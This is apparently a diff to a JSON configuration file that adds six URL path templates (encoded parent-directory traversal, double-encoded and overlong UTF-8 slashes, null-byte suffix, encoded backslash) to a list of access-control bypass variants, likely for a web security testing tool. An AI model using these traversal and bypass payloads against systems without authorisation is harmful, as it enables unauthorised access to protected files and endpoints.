@@ -78,5 +78,35 @@
     "name": "semicolon-slash",
     "description": "Append semicolon slash combo",
     "path_template": "{origin}/{path};/"
+  },
+  {
+    "name": "encoded-parent-prefix",
+    "description": "Prefix the path with encoded parent directory reference",
+    "path_template": "{origin}/%2e%2e/{path}"
+  },
+  {
+    "name": "mixed-encoded-parent",
+    "description": "Blend literal dots with encoded slash for traversal",
+    "path_template": "{origin}/..%2f{path}"
+  },
+  {
+    "name": "double-encoded-slash",
+    "description": "Use double-encoded slash before the path",
+    "path_template": "{origin}/%252f{path}"
+  },
+  {
+    "name": "overlong-unicode-slash",
+    "description": "Inject UTF-8 overlong slash representation",
+    "path_template": "{origin}/%c0%af{path}"
+  },
+  {
+    "name": "null-byte-suffix",
+    "description": "Terminate the path with encoded null byte and slash",
+    "path_template": "{origin}/{path}%00/"
+  },
+  {
+    "name": "encoded-backslash-traversal",
+    "description": "Use encoded backslash to mimic Windows traversal",
+    "path_template": "{origin}/..%5c{path}"
   }
 ]
